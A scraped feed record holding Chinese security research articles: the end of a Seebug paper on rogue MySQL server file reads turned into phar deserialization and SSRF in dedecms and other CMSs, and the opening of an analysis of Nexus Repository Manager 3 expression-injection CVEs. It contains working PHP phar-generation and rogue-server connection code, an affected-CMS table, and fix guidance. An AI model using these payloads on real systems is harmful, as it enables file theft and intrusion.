//添加要压缩的文件\n//签名自动计算\n$phar-&#38;gt;stopBuffering();\n?&#38;gt;</pre>\n\n\n\n<p>使用该文件生成一个phar.phar</p>\n\n\n\n<p>然后我们模拟一次查询</p>\n\n\n\n<pre class=\"crayon-plain-tag\">test.php\n\n&#38;lt;?php\nclass A {\n    public $s = '';\n    public function __wakeup () {\n        echo &#34;pwned!!&#34;;\n    }\n}\n\n\n$m = mysqli_init();\nmysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);\n$s = mysqli_real_connect($m, '{evil_mysql_ip}', 'root', '123456', 'test', 3667);\n$p = mysqli_query($m, 'select 1;');\n\n// file_get_contents('phar://./phar.phar');</pre>\n\n\n\n<p>图中我们只做了select 1查询，但我们伪造的evil mysql server中驱使mysql client去做<code>load file local</code>查询，读取了本地的</p>\n\n\n\n<pre class=\"crayon-plain-tag\">phar://./phar.phar</pre>\n\n\n\n<p>成功触发反序列化</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/1a355243-1701-456e-ad9a-487f5931df48.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h2 id=\"to-rce\">反序列化 to RCE</h2>\n\n\n\n<p>当一个反序列化漏洞出现的时候，我们就需要从源代码中去寻找合适的pop链，建立在pop链的利用基础上，我们可以进一步的扩大反序列化漏洞的危害。</p>\n\n\n\n<p>php序列化中常见的魔术方法有以下 - 当对象被创建的时候调用：<strong>construct - 当对象被销毁的时候调用：</strong>destruct - 当对象被当作一个字符串使用时候调用：<strong>toString - 序列化对象之前就调用此方法(其返回需要是一个数组)：</strong>sleep - 反序列化恢复对象之前就调用此方法：<strong>wakeup - 当调用对象中不存在的方法会自动调用此方法：</strong>call</p>\n\n\n\n<p>配合与之相应的pop链，我们就可以把反序列化转化为RCE。</p>\n\n\n\n<h3 id=\"dedecms-to-ssrf\">dedecms 后台反序列化漏洞 to SSRF</h3>\n\n\n\n<p>dedecms 后台，模块管理，安装UCenter模块。开始配置</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/c56ad36c-ae7d-455c-85e8-3ff005b27d01.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>首先需要找一个确定的UCenter服务端，可以通过找一个dz的站来做服务端。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/f55a7398-56ff-486c-ac04-176fa2f605cf.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>然后就会触发任意文件读取，当然，如果读取文件为phar，则会触发反序列化。</p>\n\n\n\n<p>我们需要先生成相应的phar</p>\n\n\n\n<pre class=\"crayon-plain-tag\">&#38;lt;?php\n\nclass Control\n{\n    var $tpl;\n    // $a = new SoapClient(null,array('uri'=&#38;gt;'http://example.com:5555', 'location'=&#38;gt;'http://example.com:5555/aaa'));\n    public $dsql;\n\n    function __construct(){\n        $this-&#38;gt;dsql = new SoapClient(null,array('uri'=&#38;gt;'http://xxxx:5555', 'location'=&#38;gt;'http://xxxx:5555/aaa'));\n    }\n\n    function __destruct() {\n        unset($this-&#38;gt;tpl);\n        $this-&#38;gt;dsql-&#38;gt;Close(TRUE);\n    }\n}\n\n@unlink(&#34;dedecms.phar&#34;);\n$phar = new Phar(&#34;dedecms.phar&#34;);\n$phar-&#38;gt;startBuffering();\n$phar-&#38;gt;setStub(&#34;GIF89a&#34;.&#34;&#38;lt;?php __HALT_COMPILER(); ?&#38;gt;&#34;); //设置stub，增加gif文件头\n$o = new Control();\n$phar-&#38;gt;setMetadata($o); //将自定义meta-data存入manifest\n$phar-&#38;gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;); //添加要压缩的文件\n//签名自动计算\n$phar-&#38;gt;stopBuffering();\n\n?&#38;gt;</pre>\n\n\n\n<p>然后我们可以直接通过前台上传头像来传文件，或者直接后台也有文件上传接口，然后将rogue mysql server来读取这个文件</p>\n\n\n\n<pre class=\"crayon-plain-tag\">phar://./dedecms.phar/test.txt</pre>\n\n\n\n<p>监听5555可以收到</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/e95504be-605c-4b56-a4b1-6cf2ec62b4cf.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>ssrf进一步可以攻击redis等拓展攻击面，就不多说了。</p>\n\n\n\n<h2 id=\"cms\">部分CMS测试结果</h2>\n\n\n\n<table class=\"wp-block-table\"><thead><tr><th>CMS名</th><th>影响版本</th><th>是否存在mysql任意文件读取</th><th>是否有可控的MySQL服务器设置</th><th>是否有可控的反序列化</th><th>是否可上传phar</th><th>补丁</th></tr></thead><tbody><tr><td>phpmyadmin</td><td>&#60; 4.8.5</td><td>是</td><td>是</td><td>是</td><td>是</td><td><a href=\"https://github.com/phpmyadmin/phpmyadmin/commit/828f740158e7bf14aa4a7473c5968d06364e03a2\">补丁</a></td></tr><tr><td>Dz</td><td>未修复</td><td>是</td><td>是</td><td>否</td><td>None</td><td>None</td></tr><tr><td>drupal</td><td>None</td><td>否(使用PDO)</td><td>否(安装)</td><td>是</td><td>是</td><td>None</td></tr><tr><td>dedecms</td><td>None</td><td>是</td><td>是(ucenter)</td><td>是(ssrf)</td><td>是</td><td>None</td></tr><tr><td>ecshop</td><td>None</td><td>是</td><td>是</td><td>否</td><td>是</td><td>None</td></tr><tr><td>禅道</td><td>None</td><td>否(PDO)</td><td>否</td><td>None</td><td>None</td><td>None</td></tr><tr><td>phpcms</td><td>None</td><td>是</td><td>是</td><td>是(ssrf)</td><td>是</td><td>None</td></tr><tr><td>帝国cms</td><td>None</td><td>是</td><td>是</td><td>否</td><td>None</td><td>None</td></tr><tr><td>phpwind</td><td>None</td><td>否(PDO)</td><td>是</td><td>None</td><td>None</td><td>None</td></tr><tr><td>mediawiki</td><td>None</td><td>是</td><td>否（后台没有修改mysql配置的方法）</td><td>是</td><td>是</td><td>None</td></tr><tr><td>Z-Blog</td><td>None</td><td>是</td><td>否（后台没有修改mysql配置的方法）</td><td>是</td><td>是</td><td>None</td></tr></tbody></table>\n\n\n\n<h1 id=\"_8\">修复方式</h1>\n\n\n\n<p>对于大多数mysql的客户端来说，load file local是一个无用的语句，他的使用场景大多是用于传输数据或者上传数据等。对于客户端来说，可以直接关闭这个功能，并不会影响到正常的使用。</p>\n\n\n\n<p>具体的关闭方式见文档 -&#160;<a href=\"https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html\">https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html</a></p>\n\n\n\n<p>对于不同服务端来说，这个配置都有不同的关法，对于JDBC来说，这个配置叫做<code>allowLoadLocalInfile</code></p>\n\n\n\n<ul><li><a href=\"https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html\">https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-reference-configuration-properties.html</a></li></ul>\n\n\n\n<p>在php的mysqli和mysql两种链接方式中，底层代码直接决定了这个配置。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/8544581b-1f88-439a-b631-fc557ab7b4d2.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这个配置是<code>PHP_INI_SYSTEM</code>，在php的文档中，这个配置意味着<code>Entry can be set in php.ini or httpd.conf</code>。</p>\n\n\n\n<p>所以只有在php.ini中修改<code>mysqli.allow_local_infile = Off</code>就可以修复了。</p>\n\n\n\n<p>在php7.3.4的更新中，mysqli中这个配置也被默认修改为关闭</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://github.com/php/php-src/commit/2eaabf06fc5a62104ecb597830b2852d71b0a111#diff-904fc143c31bb7dba64d1f37ce14a0f5\n</div></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/cfe7f0b5-da1c-459e-beaa-31d812320232.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>可惜在不再更新的旧版本mysql5.6中，无论是mysql还是mysqli默认都为开启状态。</p>\n\n\n\n<p>现在的代码中也可以通过<code>mysqli_option</code>，在链接前配置这个选项。</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttp://php.net/manual/zh/mysqli.options.php\n</div></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/dd424e1f-4853-4f7f-943d-dc0529a258ea.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>比较有趣的是，通过这种方式修复，虽然禁用了<code>allow_local_infile</code>，但是如果使用wireshark抓包却发现<code>allow_local_infile</code>仍是启动的（但是无效）。</p>\n\n\n\n<p>在旧版本的phpmyadmin中，先执行了<code>mysqli_real_connect</code>，然后设置<code>mysql_option</code>，这样一来<code>allow_local_infile</code>实际上被禁用了，但是在发起链接请求时中<code>allow_local_infile</code>还没有被禁用。</p>\n\n\n\n<p>实际上是因为<code>mysqli_real_connect</code>在执行的时候，会初始化<code>allow_local_infile</code>。在php代码底层<code>mysqli_real_connect</code>实际是执行了<code>mysqli_common_connect</code>。而在<code>mysqli_common_connect</code>的代码中，设置了一次<code>allow_local_infile</code>。</p>\n\n\n\n<figure class=\"wp-block-embed\"><div class=\"wp-block-embed__wrapper\">\nhttps://github.com/php/php-src/blob/ca8e2abb8e21b65a762815504d1fb3f20b7b45bc/ext/mysqli/mysqli_nonapi.c#L251\n</div></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/01/c933d3c8-6f70-4622-b898-8d21d0a17bba.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>如果在<code>mysqli_real_connect</code>之前设置<code>mysql_option</code>，其<code>allow_local_infile</code>的配置会被覆盖重写，其修改就会无效。</p>\n\n\n\n<p>phpmyadmin在1月22日也正是通过交换两个函数的相对位置来修复了该漏洞。&#160;<a href=\"https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f\">https://github.com/phpmyadmin/phpmyadmin/commit/c5e01f84ad48c5c626001cb92d7a95500920a900#diff-cd5e76ab4a78468a1016435eed49f79f</a></p>\n\n\n\n<h1 id=\"_9\">说在最后</h1>\n\n\n\n<p>这是一个针对mysql feature的攻击模式，思路非常有趣，就目前而言在mysql层面没法修复，只有在客户端关闭了这个配置才能避免印象。虽然作为攻击面并不是很广泛，但可能针对一些特殊场景的时候，可以特别有效的将一个正常的功能转化为任意文件读取，在拓展攻击面上非常的有效。</p>\n\n\n\n<p>详细的攻击场景这里就不做假设了，危害还是比较大的。</p>\n\n\n\n<h1 id=\"ref\">REF</h1>\n\n\n\n<ul><li><a href=\"http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/\">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></li><li><a href=\"https://lightless.me/archives/read-mysql-client-file.html\">https://lightless.me/archives/read-mysql-client-file.html</a></li><li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/load-data.html\">https://dev.mysql.com/doc/refman/8.0/en/load-data.html</a></li><li><a href=\"https://dev.mysql.com/doc/refman/8.0/en/load-data.html\">https://dev.mysql.com/doc/refman/8.0/en/load-data.html</a></li></ul>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1112/\">https://paper.seebug.org/1112/</a></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:51:32 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/01/6c2dc026-fc41-433f-ab54-fa0ae3987be7.png-w331s","linkMd5":"ab33b3ddb46874e5b2d2b211d2a3a454","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn49@2020_6/2020/08/24/21-14-50-385_392799a103dc1d6b.webp","destWidth":864,"destHeight":403,"sourceBytes":41170,"destBytes":55242,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/01/6c2dc026-fc41-433f-ab54-fa0ae3987be7.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn49@2020_6/2020/08/24/21-14-50-385_392799a103dc1d6b.webp","https://images.seebug.org/content/images/2020/01/aa58b1ee-630b-4f2b-962f-9b0390559704.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn89@2020_2/2020/08/24/21-14-57-196_5c581fc1453e4a5e.webp","https://images.seebug.org/content/images/2020/01/e53b8f71-39aa-4b18-96b8-d74a413b513b.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn24@2020_5/2020/08/24/21-14-59-679_a08fe9961b524d41.webp","https://images.seebug.org/content/images/2020/01/33e67c1a-6191-428a-a780-4d8d76f481db.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn89@2020_5/2020/08/24/21-14-54-128_2491489af176215c.webp","https://images.seebug.org/content/images/2020/01/c847d3bf-ba54-4569-b854-fab51bfa8d1d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn100@2020_5/2020/08/24/21-15-01-161_a78d16d221bd64c6.webp","https://images.seebug.org/content/images/2020/01/8e9399b4-1ef4-4117-bf48-6578517ca95a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn42@2020_2/2020/08/24/21-14-57-940_1c0f3dde2bd22f81.webp","https://images.seebug.org/content/images/2020/01/a4e7ce99-3d0b-4d0f-a4bf-bea9dada1416.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn46@2020_3/2020/08/24/21-14-57-071_64b76af9962a2522.webp","https://images.seebug.org/content/images/2020/01/be3119ec-00b7-44f2-a394-4bfbefc68eaf.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn84@2020_6/2020/08/24/21-15-00-549_9a037f4f1012b9b2.webp","https://images.seebug.org/content/images/2020/01/291ea879-e6dd-46a6-af48-4dd927485670.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn74@2020_5/2020/08/24/21-14-53-962_4e8c43d6d4205a63.webp","https://images.seebug.org/content/images/2020/01/90884546-97b7-47b1-a29e-9912f5c1e69a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn38@2020_3/2020/08/24/21-14-56-554_fa2f6a165d982443.webp","https://images.seebug.org/content/images/2020/01/c3b395ad-cf4a-4f65-8584-eb9199ecf4a0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn84@2020_3/2020/08/24/21-14-59-211_6254d0f7bf64298a.webp","https://images.seebug.org/content/images/2020/01/511f3f93-4d6c-43d0-a614-4cc1a686209b.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn97@2020_6/2020/08/24/21-14-56-429_29e6f955934e87e2.webp","https://images.seebug.org/content/images/2020/02/e95cd253-be42-413c-89b4-8a6dde233c59.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn2@2020_5/2020/08/24/21-14-54-641_0767e9ff5b2236f2.webp","https://images.seebug.org/content/images/2020/01/8f9113ec-33b6-4313-bc7a-61e1ab607322.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn31@2020_3/2020/08/24/21-15-01-976_f77594dda8848695.webp","https://images.seebug.org/content/images/2020/01/ae52a1ad-c092-427f-b647-7dbd0c085906.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn77@2020_4/2020/08/24/21-14-53-833_211850a3860bdff1.webp","https://images.seebug.org/content/images/2020/01/9b86c20c-ece2-44b3-8338-c82a62e93dde.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn92@2020_2/2020/08/24/21-14-59-574_190b96dcaf4dea3b.webp","https://images.seebug.org/content/images/2020/01/3d907ced-e9e6-456c-82bb-07878c6ffcbe.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn9@2020_4/2020/08/24/21-14-56-519_13b5ecf81234c974.webp","https://images.seebug.org/content/images/2020/01/b0c089b7-626a-4754-a28a-5e240c2630c1.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn68@2020_4/2020/08/24/21-15-00-185_1a3aab21e29e9fcf.webp","https://images.seebug.org/content/images/2020/01/2c2ccf41-e547-4e4c-ad75-1efc6115619e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn30@2020_6/2020/08/24/21-14-56-442_8321f13dd914ba02.webp","https://images.seebug.org/content/images/2020/01/8be09aec-6224-4656-8020-3c22403148ec.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn73@2020_2/2020/08/24/21-14-52-701_9125bcf02036b269.webp","https://images.seebug.org/content/images/2020/01/a04db4e7-7b94-40e7-9518-6062a46ef395.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn77@2020_6/2020/08/24/21-14-55-794_4d07ca9c7585aaad.webp","https://images.seebug.org/content/images/2020/01/2b361b21-f6c9-438a-8f1f-aac90656e6be.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn90@2020_6/2020/08/24/21-14-55-284_07c3a12de6e7923a.webp","https://images.seebug.org/content/images/2020/01/70ab5ff4-662c-4d88-a294-827053eccb06.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn50@2020_3/2020/08/24/21-14-55-808_c60be13627a285cb.webp","https://images.seebug.org/content/images/2020/01/493cbb0c-fa2b-4ead-8e33-df260c886fdb.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn64@2020_1/2020/08/24/21-15-00-541_234ea05760f5e696.webp","https://images.seebug.org/content/images/2020/01/3d3f6fb2-6e49-459a-a211-0e89b928047d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn32@2020_5/2020/08/24/21-15-01-121_e5e6ada931c9008b.webp","https://images.seebug.org/content/images/2020/01/1cb2003d-40e8-4acb-80f5-83dc55d4bf94.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn46@2020_1/2020/08/24/21-14-55-752_b9e38aa0ab0e9e9e.webp","https://images.seebug.org/content/images/2020/01/9ff109c7-a1eb-4053-93bc-e7ab8f203015.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn28@2020_2/2020/08/24/21-14-58-542_1f7cd54fbda16908.webp","https://images.seebug.org/content/images/2020/01/1a355243-1701-456e-ad9a-487f5931df48.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn86@2020_3/2020/08/24/21-14-53-222_a8bb3fece2c0a64d.webp","https://images.seebug.org/content/images/2020/01/c56ad36c-ae7d-455c-85e8-3ff005b27d01.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn12@2020_2/2020/08/24/21-15-01-439_0dbaa5ebd31fb872.webp","https://images.seebug.org/content/images/2020/01/f55a7398-56ff-486c-ac04-176fa2f605cf.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn61@2020_1/2020/08/24/21-14-56-451_7e6605cf0663fb30.webp","https://images.seebug.org/content/images/2020/01/e95504be-605c-4b56-a4b1-6cf2ec62b4cf.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn49@2020_2/2020/08/24/21-14-54-583_f40aadf888ef49a8.webp","https://images.seebug.org/content/images/2020/01/8544581b-1f88-439a-b631-fc557ab7b4d2.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn80@2020_4/2020/08/24/21-15-01-087_5c5249112aac0944.webp","https://images.seebug.org/content/images/2020/01/cfe7f0b5-da1c-459e-beaa-31d812320232.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn76@2020_3/2020/08/24/21-15-00-712_60698ff6701d9591.webp","https://images.seebug.org/content/images/2020/01/dd424e1f-4853-4f7f-943d-dc0529a258ea.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn47@2020_5/2020/08/24/21-14-53-842_fd5ea3217e193d5e.webp","https://images.seebug.org/content/images/2020/01/c933d3c8-6f70-4622-b898-8d21d0a17bba.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn38@2020_1/2020/08/24/21-14-54-038_c3112e8d9f18ee53.webp","https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_5/2020/08/24/21-15-00-499_446834a71d30acd0.webp"},"publishedOrCreatedDate":1598303688721},{"createdTime":"2020-08-25 05:14:48","updatedTime":"2020-08-25 05:14:48","title":"Nexus Repository Manager 3 几次表达式解析漏洞","link":"https://blog.knownsec.com/?p=5024","description":"\n<p><strong>作者：Longofo@知道创宇404实验室<br>时间：2020年4月8日</strong></p>\n\n\n\n<p>Nexus Repository Manager 3最近曝出两个el表达式解析漏洞，编号为<a href=\"https://support.sonatype.com/hc/en-us/articles/360044882533\">CVE-2020-10199</a>，<a href=\"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\">CVE-2020-10204</a>，都是由Github Secutiry Lab团队的@pwntester发现。由于之前Nexus3的漏洞没有去跟踪，所以当时diff得很头疼，并且Nexus3 bug与安全修复都是混在一起，更不容易猜到哪个可能是漏洞位置了。后面与@r00t4dm师傅一起复现出了<a href=\"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\">CVE-2020-10204</a>，<a href=\"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\">CVE-2020-10204</a>是<a href=\"https://support.sonatype.com/hc/en-us/articles/360010789153-CVE-2018-16621-Nexus-Repository-Manager-Java-Injection-October-17-2018\">CVE-2018-16621</a>的绕过，之后又有师傅弄出了<a href=\"https://support.sonatype.com/hc/en-us/articles/360044882533\">CVE-2020-10199</a>，这三个漏洞的根源是一样的，其实并不止这三处，官方可能已经修复了好几处这样的漏洞，由于历史不太好追溯回去，所以加了可能，通过后面的分析，就能看到了。还有之前的<a href=\"https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-2019-02-05\">CVE-2019-7238</a>，这是一个jexl表达式解析，一并在这里分析下，以及对它的修复问题，之前看到有的分析文章说这个漏洞是加了个权限来修复，可能那时是真的只加了个权限吧，不过我测试用的较新的版本，加了权限貌似也没用，在Nexus3高版本已经使用了jexl白名单的沙箱。</p>\n\n\n\n<h4 id=\"_1\">测试环境</h4>\n\n\n\n<p>文中会用到三个Nexus3环境：</p>\n\n\n\n<ul><li>nexus-3.14.0-04</li><li>nexus-3.21.1-01</li><li>nexus-3.21.2-03</li></ul>\n\n\n\n<p><code>nexus-3.14.0-04</code>用于测试jexl表达式解析，<code>nexus-3.21.1-01</code>用于测试jexl表达式解析与el表达式解析以及diff，<code>nexus-3.21.2-03</code>用于测试el表达式解析以及diff</p>\n\n\n\n<h4 id=\"diff\">漏洞diff</h4>\n\n\n\n<p>CVE-2020-10199、CVE-2020-10204漏洞的修复界限是3.21.1与3.21.2，但是github开源的代码分支好像不对应，所以只得去下载压缩包来对比了。在官方下载了<code>nexus-3.21.1-01</code>与<code>nexus-3.21.2-03</code>，但是beyond对比需要目录名一样，文件名一样，而不同版本的代码有的文件与文件名都不一样。我是先分别反编译了对应目录下的所有jar包，然后用脚本将<code>nexus-3.21.1-01</code>中所有的文件与文件名中含有3.21.1-01的替换为了3.21.2-03，同时删除了META文件夹，这个文件夹对漏洞diff没什么用并且影响diff分析，所以都删除了，下面是处理后的效果：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/54f81ba1-d814-4f39-8752-31c50ceab3e8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>如果没有调试和熟悉之前的Nexus3漏洞，直接去看diff可能会看得很头疼，没有目标的diff。</p>\n\n\n\n<h4 id=\"_2\">路由以及对应的处理类</h4>\n\n\n\n<h5 id=\"_3\">一般路由</h5>\n\n\n\n<p>抓下nexus3发的包，随意的点点点，可以看到大多数请求都是POST类型的，URI都是<code>/service/extdirect</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/ee24d6df-cd81-4a21-9e66-bef5a87f5c02.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>post内容如下：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">{&#34;action&#34;:&#34;coreui_Repository&#34;,&#34;method&#34;:&#34;getBrowseableFormats&#34;,&#34;data&#34;:null,&#34;type&#34;:&#34;rpc&#34;,&#34;tid&#34;:7}</pre>\n\n\n\n<p>可以看下其他请求，json中都有<code>action</code>与<code>method</code>这两个key，在代码中搜索下<code>coreui_Repository</code>这个关键字：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/68c35d66-7d4a-4c1f-9bb8-cf95d6886d8c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>可以看到这样的地方，展开看下代码：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/ffe5ae14-c22a-40e9-8747-3cd2e961b5f3.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过注解方式注入了action，上面post的<code>method-&#62;getBrowseableFormats</code>也在中，通过注解注入了对应的method：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/126eb9bf-e825-4a1e-953b-5cb16423f711.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>所以之后这样的请求，我们就很好定位路由与对应的处理类了</p>\n\n\n\n<h5 id=\"api\">API路由</h5>\n\n\n\n<p>Nexus3的API也出现了漏洞，来看下怎么定位API的路由，在后台能看到Nexus3提供的所有API。</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/f351fbe2-e26f-4b1b-902b-5dc0af2d59cc.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>点几个看下包，有GET、POST、DELETE、PUT等类型的请求：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/5dae87a4-ad25-4680-b86b-cafc19562f3e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>没有了之前的action与method，这里用URI来定位，直接搜索<code>/service/rest/beta/security/content-selectors</code>定位不到，所以缩短关键字，用<code>/beta/security/content-selectors</code>来定位：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/c80672ed-1c47-439f-b0f7-fea62692384a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/76977519-5dc6-48ea-945d-cb3effed6504.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过@Path注解来注入URI，对应的处理方式也使用了对应的@GET、@POST来注解</p>\n\n\n\n<p>可能还有其他类型的路由，不过也可以使用上面类似的方式进行搜索来定位。还有Nexus的权限问题，可以看到上面有的请求通过@RequiresPermissions来设置了权限，不过还是以实际的测试权限为准，有的在到达之前也进行了权限校验，有的操作虽然在web页面的admin页面，不过本不需要admin权限，可能无权限或者只需要普通权限。</p>\n\n\n\n<h4 id=\"buildconstraintviolationwithtemplatejava-el\">buildConstraintViolationWithTemplate造成的几次Java EL漏洞</h4>\n\n\n\n<p>在跟踪调试了<a href=\"https://support.sonatype.com/hc/en-us/articles/360010789153-CVE-2018-16621-Nexus-Repository-Manager-Java-Injection-October-17-2018\">CVE-2018-16621</a>与<a href=\"https://support.sonatype.com/hc/en-us/articles/360044356194-CVE-2020-10204-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\">CVE-2020-10204</a>之后，感觉<code>buildConstraintViolationWithTemplate</code>这个keyword可以作为这个漏洞的根源，因为从调用栈可以看出这个函数的调用处于Nexus包与hibernate-validator包的分界，并且计算器的弹出也是在它之后进入hibernate-validator的处理流程，即<code>buildConstraintViolationWithTemplate(xxx).addConstraintViolation()</code>，最终在hibernate-validator包中的ElTermResolver中通过<code>valueExpression.getValue(context)</code>完成了表达式的执行，与@r00t4dm师傅也说到了这个：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/6a07cab3-67ca-4c9c-aa31-5ce6b3f927bc.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>于是反编译了Nexus3所有jar包，然后搜索这个关键词（使用的修复版本搜索，主要是看有没有遗漏的地方没修复；Nexue3有开源部分代码，也可以直接在源码搜索）：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">F:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\com\\sonatype\\nexus\\plugins\\nexus-healthcheck-base\\3.21.2-03\\nexus-healthcheck-base-3.21.2-03\\com\\sonatype\\nexus\\clm\\validator\\ClmAuthenticationValidator.java:\n   26           return this.validate(ClmAuthenticationType.valueOf(iqConnectionXo.getAuthenticationType(), ClmAuthenticationType.USER), iqConnectionXo.getUsername(), iqConnectionXo.getPassword(), context);\n   27        } else {\n   28:          context.buildConstraintViolationWithTemplate(&#34;unsupported annotated object &#34; + value).addConstraintViolation();\n   29           return false;\n   30        }\n   ..\n   35        case 1:\n   36           if (StringUtils.isBlank(username)) {\n   37:             context.buildConstraintViolationWithTemplate(&#34;User Authentication method requires the username to be 